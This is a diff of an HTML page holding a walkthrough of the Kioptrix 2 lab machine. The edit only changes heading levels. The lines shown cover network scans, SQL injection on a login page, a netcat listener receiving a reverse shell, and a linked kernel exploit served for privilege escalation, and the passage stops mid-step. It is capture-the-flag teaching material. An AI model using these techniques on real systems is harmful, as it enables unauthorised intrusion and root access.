@@ -154,11 +154,13 @@
 
     <br> <div class="text-justify">
 
-<h1 id="summary">Summary</h1>
+<h1 id="kioptrix-2">Kioptrix 2</h1>
+
+<h2 id="summary">Summary</h2>
 
 <p>Easy machine, which is vulnerable to SQL injection, that gives the possibility to get a reverse shell. While on the machine, we can execute a kernel exploit, that gives us root privileges.</p>
 
-<h1 id="netdiscover">Netdiscover</h1>
+<h2 id="netdiscover">Netdiscover</h2>
 
 <pre><code class="language-bash">root@kali:~# netdiscover
 Currently scanning: 192.168.81.0/16   |   Screen View: Unique Hosts
@@ -172,7 +174,7 @@ Currently scanning: 192.168.81.0/16   |   Screen View: Unique Hosts
  15:44:58 2018 -- 1 IP address (1 host up) scanned in 44.08 seconds
 </code></pre>
 
-<h1 id="nmap">Nmap</h1>
+<h2 id="nmap">Nmap</h2>
 
 <pre><code class="language-bash">root@kali:~/vulnhub/kioptrix2# nmap -sV -A -oA nmap 192.168.56.13 -p-
 # Nmap 7.60 scan initiated Tue Mar 27 15:44:14 2018 as: nmap -sV -A -p- -oA nmap 192.168.56.13
@@ -238,7 +240,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Tue Mar 27 15:44:58 2018 -- 1 IP address (1 host up) scanned in 44.08 seconds
 </code></pre>
 
-<h1 id="index-php">Index.php</h1>
+<h2 id="index-php">Index.php</h2>
 
 <p>On the login page, we try SQL injection with both username and password as</p>
 
@@ -254,7 +256,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 <p>and wait for the incoming connection.</p>
 
-<h1 id="reverse-shell">Reverse shell</h1>
+<h2 id="reverse-shell">Reverse shell</h2>
 
 <pre><code class="language-bash">root@kali:~/vulnhub/kioptrix2# nc -lvnp 1453
 listening on [any] 1453 ...
@@ -266,7 +268,7 @@ bash-3.00$ uname -ar
 Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
 </code></pre>
 
-<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
 
 <p>The Linux Kernel Version 2.6.9-55.EL is vulnerable. Searching on google for this version leads to following exploit: <b><a><a href="https://www.exploit-db.com/exploits/9545/">https://www.exploit-db.com/exploits/9545/</a></a></b>
 After downloadting the exploit, we can compile it on our machine and serve it via python SimpleHTTPServer:</p>
